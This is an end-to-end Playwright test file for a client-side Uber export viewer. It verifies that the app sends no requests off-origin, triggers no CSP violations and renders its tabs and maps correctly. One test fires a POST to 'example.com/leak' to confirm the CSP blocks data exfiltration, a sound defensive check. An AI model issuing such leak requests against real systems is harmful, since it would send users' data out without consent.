/**
 * End-to-end checks on the production build (served by `vite preview` with the
 * same CSP header as Netlify):
 *  - no request ever leaves the origin, before or after loading an export;
 *  - no CSP violation;
 *  - the four tabs render, keyboard navigation works, no horizontal scroll on mobile;
 *  - "Charger un autre export" resets the state.
 */
import { expect, test, type Page } from '@playwright/test';
import { strToU8, zipSync } from 'fflate';
import { existsSync, readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { makeDemoExport } from '../../scripts/make-demo-export.mjs';

const fx = (name: string) => readFileSync(fileURLToPath(new URL(`../fixtures/${name}`, import.meta.url)));

function syntheticZip(): Buffer {
  const zip = zipSync({
    'Uber Data/Rider/rider_lifetime_trips-0.csv': fx('trips_basic.csv'),
    'Uber Data/Rider/rider_lifetime_ratings_received-0.csv': fx('ratings.csv'),
    'Uber Data/Eats/eats_order_details-0.csv': fx('eats_multiline.csv'),
    'Uber Data/Eats/eats_app_analytics-0.csv': strToU8('msg.eats_app.device.ip_address\n10.0.0.1\n'),
    'Uber Data/Account and Profile/rider_account_profile_information-0.csv': fx('sensitive_profile.csv'),
    'Uber Data/Account and Profile/payment_methods-0.csv': fx('sensitive_payments.csv'),
    'Uber Data/Account and Profile/rider_eater_saved_locations.csv': fx('locations.csv'),
    'Uber Data/Account and Profile/customer_support_tickets-0.csv': fx('support.csv'),
  });
  return Buffer.from(zip);
}

const samplePath = fileURLToPath(new URL('../../sample-data/uber-export.zip', import.meta.url));

interface Watch {
  requests: string[];
  cspViolations: () => Promise<string[]>;
}

async function watch(page: Page): Promise<Watch> {
  const requests: string[] = [];
  page.on('request', (r) => requests.push(r.url()));
  await page.addInitScript(() => {
    (window as unknown as { __csp: string[] }).__csp = [];
    document.addEventListener('securitypolicyviolation', (e) => {
      (window as unknown as { __csp: string[] }).__csp.push(`${e.violatedDirective} ${e.blockedURI}`);
    });
  });
  return {
    requests,
    cspViolations: () => page.evaluate(() => (window as unknown as { __csp: string[] }).__csp),
  };
}

async function upload(page: Page, name: string, buffer: Buffer) {
  await page.locator('input[type=file]').setInputFiles({ name, mimeType: 'application/zip', buffer });
  await expect(page.getByRole('heading', { name: 'Votre rétrospective Uber' })).toBeVisible({ timeout: 30_000 });
}

const TABS = ['Vue d’ensemble', 'Uber Eats', 'Courses', 'Compte'];

test('no external request and no CSP violation, before and after loading an export', async ({ page, baseURL }) => {
  const w = await watch(page);
  await page.goto('/');
  await expect(page.getByText(/lues uniquement dans votre navigateur/)).toBeVisible();
  await expect(page.getByText(/non affilié à Uber/)).toBeVisible();

  await upload(page, 'export.zip', syntheticZip());
  for (const name of TABS) {
    await page.getByRole('tab', { name }).click();
    await expect(page.getByRole('tab', { name })).toHaveAttribute('aria-selected', 'true');
    await expect(page.locator('[role=tabpanel] .card').first()).toBeVisible();
  }

  const external = w.requests.filter((u) => !u.startsWith(baseURL!) && !u.startsWith('data:') && !u.startsWith('blob:'));
  expect(external, 'requests leaving the origin').toEqual([]);
  expect(await w.cspViolations()).toEqual([]);

  // Sensitive values from the fixtures are never rendered.
  const html = await page.content();
  for (const secret of ['SECRET_LASTNAME', 'secret@example.com', '4111111111111111', 'SECRET_MESSAGE', '10.0.0.1']) {
    expect(html).not.toContain(secret);
  }
});

test('the network is really blocked by the CSP', async ({ page }) => {
  await page.goto('/');
  const result = await page.evaluate(async () => {
    try {
      await fetch('https://example.com/leak', { method: 'POST', body: 'x' });
      return 'sent';
    } catch {
      return 'blocked';
    }
  });
  expect(result).toBe('blocked');
});

test('warnings panel, keyboard tabs and reset', async ({ page }) => {
  await page.goto('/');
  await upload(page, 'export.zip', syntheticZip());

  await expect(page.getByText(/Avertissements \(\d+\)/)).toBeVisible();
  await page.getByText(/Avertissements \(\d+\)/).click();
  await expect(page.getByText(/ignoré volontairement/)).toBeVisible();

  const first = page.getByRole('tab', { name: 'Vue d’ensemble' });
  await first.focus();
  await page.keyboard.press('ArrowRight');
  await expect(page.getByRole('tab', { name: 'Uber Eats' })).toHaveAttribute('aria-selected', 'true');
  await expect(page.getByRole('tab', { name: 'Uber Eats' })).toBeFocused();
  await page.keyboard.press('End');
  await expect(page.getByRole('tab', { name: 'Compte' })).toHaveAttribute('aria-selected', 'true');
  await page.keyboard.press('ArrowRight');
  await expect(first).toHaveAttribute('aria-selected', 'true');

  // Table filter & sort on the Courses tab
  await page.getByRole('tab', { name: 'Courses' }).click();
  const search = page.getByRole('searchbox', { name: 'Rechercher' });
  await search.fill('Lausanne');
  await expect(page.getByText(/^2 \/ 4 lignes$/)).toBeVisible();

  await page.getByRole('button', { name: /Charger un autre export/ }).click();
  await expect(page.getByText('Glissez votre export Uber ici')).toBeVisible();
});

test('no horizontal scroll at 375 px', async ({ page }) => {
  await page.setViewportSize({ width: 375, height: 800 });
  await page.goto('/');
  const overflow = () => page.evaluate(() => document.documentElement.scrollWidth - window.innerWidth);
  const gutter = async (selector: string) => (await page.locator(selector).first().boundingBox())!.x;
  expect(await overflow()).toBeLessThanOrEqual(0);
  expect(await gutter('h1')).toBeGreaterThanOrEqual(16);
  await upload(page, 'export.zip', syntheticZip());
  expect(await gutter('h1')).toBeGreaterThanOrEqual(16);
  for (const name of TABS) {
    await page.getByRole('tab', { name }).click();
    await page.waitForTimeout(150);
    expect(await overflow(), `overflow on ${name}`).toBeLessThanOrEqual(0);
    expect(await gutter('[role=tabpanel] .kpi, [role=tabpanel] .card'), `gutter on ${name}`).toBeGreaterThanOrEqual(16);
  }
});

test('landing call to action and outbound links', async ({ page }) => {
  await page.goto('/');
  await expect(page.getByRole('heading', { level: 1, name: 'Uberewind' })).toBeVisible();
  const dz = page.getByRole('button', { name: /Déposer ou choisir le fichier/ });
  await expect(dz).toBeVisible();
  // Keyboard opens the file picker.
  const chooser = page.waitForEvent('filechooser');
  await dz.focus();
  await page.keyboard.press('Enter');
  await chooser;
  await expect(page.getByRole('link', { name: /code est entièrement open source/ })).toHaveAttribute('href', 'https://github.com/polo13410/Uberewind');
  await expect(page.getByRole('link', { name: /Télécharger vos données/ })).toHaveAttribute('href', /myprivacy\.uber\.com/);
});

test('offline maps: rides and Eats, city focus, no network', async ({ page, baseURL }) => {
  const w = await watch(page);
  await page.goto('/');
  await upload(page, 'demo.zip', Buffer.from(makeDemoExport()));

  await page.getByRole('tab', { name: 'Courses' }).click();
  const ridesMap = page.getByRole('img', { name: /^Carte des courses/ });
  await expect(ridesMap).toBeVisible();
  await expect(ridesMap.getByRole('button', { name: /^Paris : \d+ courses$/ })).toBeVisible();
  // Focus a city: its trips are drawn.
  await page.getByRole('combobox', { name: 'Centrer sur' }).selectOption('Paris');
  await expect(page.locator('.map-trips line').first()).toBeAttached();
  await expect(page.locator('.map-key')).toContainText('arrivée');

  await page.getByRole('tab', { name: 'Uber Eats' }).click();
  const eatsMap = page.getByRole('img', { name: /^Carte des commandes/ });
  await expect(eatsMap.getByRole('button', { name: /^Lausanne : \d+ commandes$/ })).toBeVisible();

  expect(w.requests.filter((u) => !u.startsWith(baseURL!))).toEqual([]);
  expect(await w.cspViolations()).toEqual([]);
});

test('city focus draws the offline orientation layer, still without any request', async ({ page, baseURL }) => {
  const w = await watch(page);
  await page.goto('/');
  await upload(page, 'demo.zip', Buffer.from(makeDemoExport()));
  await page.getByRole('tab', { name: 'Courses' }).click();
  await page.getByRole('combobox', { name: 'Centrer sur' }).selectOption('Paris');
  const roads = page.locator('.map-basemap .bm-road');
  await expect(roads).toHaveAttribute('d', /^M/);
  await expect(page.locator('.map-basemap .bm-urban')).toHaveAttribute('d', /^M/);
  expect(w.requests.filter((u) => !u.startsWith(baseURL!))).toEqual([]);
  expect(await w.cspViolations()).toEqual([]);
});

test('street tiles: opt-in with consent, OpenStreetMap images only, nothing else', async ({ page, baseURL }) => {
  // Serve tiles locally so the test never depends on (or calls) the real provider.
  const png = Buffer.from(
    'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+ip1sAAAAASUVORK5CYII=',
    'base64',
  );
  const tileHits: string[] = [];
  const referers: string[] = [];
  await page.route(/tile\.openstreetmap\.org/, (route) => {
    tileHits.push(route.request().url());
    referers.push(route.request().headers()['referer'] ?? '');
    return route.fulfill({ status: 200, contentType: 'image/png', body: png });
  });
  const w = await watch(page);
  await page.goto('/');
  await upload(page, 'demo.zip', Buffer.from(makeDemoExport()));
  await page.getByRole('tab', { name: 'Courses' }).click();
  await page.getByRole('combobox', { name: 'Centrer sur' }).selectOption('Paris');

  const toggle = page.getByRole('button', { name: /Afficher les rues/ }).first();
  await expect(toggle).toHaveAttribute('aria-pressed', 'false');
  await toggle.click();
  const dialog = page.getByRole('dialog', { name: 'Afficher les rues ?' });
  await expect(dialog).toContainText('rien de votre export');
  // Cancel → still nothing requested.
  await dialog.getByRole('button', { name: 'Annuler' }).click();
  await page.waitForTimeout(300);
  expect(tileHits).toEqual([]);

  // Accept → tiles requested, from OpenStreetMap only, as images.
  await toggle.click();
  await page.getByRole('dialog').getByRole('button', { name: 'Afficher les rues' }).click();
  await expect(toggle).toHaveAttribute('aria-pressed', 'true');
  await expect(page.locator('.map-tiles img').first()).toBeAttached();
  await expect(page.locator('.map-attrib')).toContainText('OpenStreetMap');
  await expect.poll(() => tileHits.length).toBeGreaterThan(0);
  for (const u of tileHits) expect(u).toMatch(/^https:\/\/tile\.openstreetmap\.org\/\d+\/\d+\/\d+\.png$/);
  // OSM's policy wants a Referer: only the site origin is sent, never a path.
  for (const r of referers) expect(r).toBe(`${baseURL}/`);
  const others = w.requests.filter((u) => !u.startsWith(baseURL!) && !/tile\.openstreetmap\.org/.test(u));
  expect(others).toEqual([]);
  expect(await w.cspViolations()).toEqual([]);

  // Off again → tiles removed; no new consent needed this visit.
  await toggle.click();
  await expect(page.locator('.map-tiles')).toHaveCount(0);
  await toggle.click();
  await expect(page.getByRole('dialog')).toHaveCount(0);
  await expect(toggle).toHaveAttribute('aria-pressed', 'true');
});

test('map zoom and pan stick (no snap back) on both maps', async ({ page }) => {
  await page.goto('/');
  await upload(page, 'demo.zip', Buffer.from(makeDemoExport()));
  for (const tab of ['Uber Eats', 'Courses']) {
    await page.getByRole('tab', { name: tab }).click();
    const map = page.locator('.map').first();
    const layer = map.locator('svg.map-svg > g');
    await expect(layer).toHaveAttribute('transform', 'translate(0,0) scale(1)');

    await map.getByRole('button', { name: 'Zoomer', exact: true }).click();
    await map.getByRole('button', { name: 'Zoomer', exact: true }).click();
    const box = (await map.locator('svg.map-svg').boundingBox())!;
    await page.mouse.move(box.x + box.width / 3, box.y + box.height / 2);
    await page.mouse.down();
    await page.mouse.move(box.x + box.width / 3 + 80, box.y + box.height / 2 + 30, { steps: 8 });
    await page.mouse.up();

    await page.waitForTimeout(500);
    const t = await layer.getAttribute('transform');
    expect(t, `${tab}: zoom kept`).toMatch(/scale\(2\.5/);
    expect(t, `${tab}: pan kept`).not.toContain('translate(0,0)');
    // Still the same a bit later, after the pointer moves around the map.
    await page.mouse.move(box.x + box.width / 2, box.y + box.height / 2, { steps: 5 });
    await page.waitForTimeout(400);
    expect(await layer.getAttribute('transform'), `${tab}: stable`).toBe(t);
  }
});

test.describe(() => {
  test.skip(!existsSync(samplePath), 'sample-data absent');
  test('real export matches the reference dashboard', async ({ page, baseURL }) => {
    const w = await watch(page);
    await page.goto('/');
    await upload(page, 'uber-export.zip', readFileSync(samplePath));

    const kpi = (label: string) => page.locator('.kpi', { has: page.locator('dt', { hasText: label }) }).locator('dd');
    await expect(kpi('Courses terminées')).toContainText('68');
    await expect(kpi('Distance parcourue')).toContainText('560 km');
    await expect(kpi('Commandes Uber Eats')).toContainText('127');

    await page.getByRole('tab', { name: 'Uber Eats' }).click();
    await expect(kpi('Lignes d’articles')).toContainText('322');
    await expect(page.getByText(/127 \/ 127 lignes/)).toBeVisible();

    await page.getByRole('tab', { name: 'Courses' }).click();
    await expect(page.getByText(/86 \/ 86 lignes/)).toBeVisible();
    await page.getByRole('tab', { name: 'Compte' }).click();
    await expect(kpi('Messages au support')).toContainText('87');

    expect(w.requests.filter((u) => !u.startsWith(baseURL!))).toEqual([]);
    expect(await w.cspViolations()).toEqual([]);
  });
});
